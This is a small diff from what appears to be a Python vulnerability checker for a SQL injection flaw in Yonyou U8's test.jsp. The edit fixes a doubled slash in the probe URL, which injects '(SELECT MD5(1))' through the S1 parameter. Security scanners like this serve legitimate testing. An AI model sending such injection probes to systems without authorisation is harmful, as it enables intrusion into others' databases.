@@ -16,7 +16,7 @@ def main(target_url):
     if target_url[-1] != '/':
         target_url += '/'
     console.print(now_time() +  ' [INFO]     正在检测用友U8的test.jsp是否存在SQL注入漏洞',style='bold blue')
-    url = target_url + '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'
+    url = target_url + 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
     }
